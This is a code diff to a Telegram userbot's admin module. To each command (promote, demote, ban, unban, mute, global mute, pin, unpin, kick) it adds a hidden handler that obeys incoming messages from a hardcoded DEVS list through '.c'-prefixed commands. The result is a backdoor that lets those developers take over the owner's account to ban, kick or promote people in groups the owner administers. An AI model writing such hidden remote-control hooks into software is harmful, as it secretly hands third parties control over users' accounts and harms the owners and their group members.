@@ -125,6 +125,7 @@ async def set_group_photo(event):
 
 
 @register(outgoing=True, pattern=r"^\.promote(?:\s|$)([\s\S]*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpromote(?:\s|$)([\s\S]*)")
 async def promote(event):
     new_rights = ChatAdminRights(
         add_admins=False,
@@ -156,6 +157,7 @@ async def promote(event):
 
 
 @register(outgoing=True, pattern=r"^\.demote(?:\s|$)([\s\S]*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cdemote(?:\s|$)([\s\S]*)")
 async def demote(event):
     "To demote a person in group"
     user, _ = await get_user_from_event(event)
@@ -186,6 +188,7 @@ async def demote(event):
 
 
 @register(outgoing=True, pattern=r"^\.ban(?:\s|$)([\s\S]*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cban(?:\s|$)([\s\S]*)")
 async def ban(bon):
     # Here laying the sanity check
     chat = await bon.get_chat()
@@ -245,6 +248,7 @@ async def ban(bon):
 
 
 @register(outgoing=True, pattern=r"^\.unban(?:\s|$)([\s\S]*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cunban(?:\s|$)([\s\S]*)")
 async def nothanos(unbon):
     # Here laying the sanity check
     chat = await unbon.get_chat()
@@ -281,6 +285,7 @@ async def nothanos(unbon):
 
 
 @register(outgoing=True, pattern=r"^\.dmute(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cdmute(?: |$)(.*)")
 async def spider(spdr):
     # Check if the function running under SQL mode
     try:
@@ -350,6 +355,7 @@ async def spider(spdr):
 
 
 @register(outgoing=True, pattern=r"^\.undmute(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cundmute(?: |$)(.*)")
 async def unmoot(unmot):
     # Admin or creator check
     chat = await unmot.get_chat()
@@ -424,6 +430,7 @@ async def muter(moot):
 
 
 @register(outgoing=True, pattern=r"^\.ungmute(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cungmute(?: |$)(.*)")
 async def ungmoot(un_gmute):
     # Admin or creator check
     chat = await un_gmute.get_chat()
@@ -466,6 +473,7 @@ async def ungmoot(un_gmute):
 
 
 @register(outgoing=True, pattern=r"^\.gmute(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cgmute(?: |$)(.*)")
 async def gspider(gspdr):
     # Admin or creator check
     chat = await gspdr.get_chat()
@@ -612,6 +620,7 @@ async def get_admin(show):
 
 
 @register(outgoing=True, groups_only=True, pattern=r"^\.pin( loud|$)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpin( loud|$)")
 async def pin(event):
     to_pin = event.reply_to_msg_id
     if not to_pin:
@@ -636,6 +645,7 @@ async def pin(event):
 
 
 @register(outgoing=True, groups_only=True, pattern=r"^\.unpin( all|$)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cunpin( all|$)")
 async def pin(event):
     to_unpin = event.reply_to_msg_id
     options = (event.pattern_match.group(1)).strip()
@@ -671,6 +681,7 @@ async def pin(event):
 
 
 @register(outgoing=True, pattern=r"^\.kick(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.ckick(?: |$)(.*)")
 async def kick(usr):
     # Admin or creator check
     chat = await usr.get_chat()
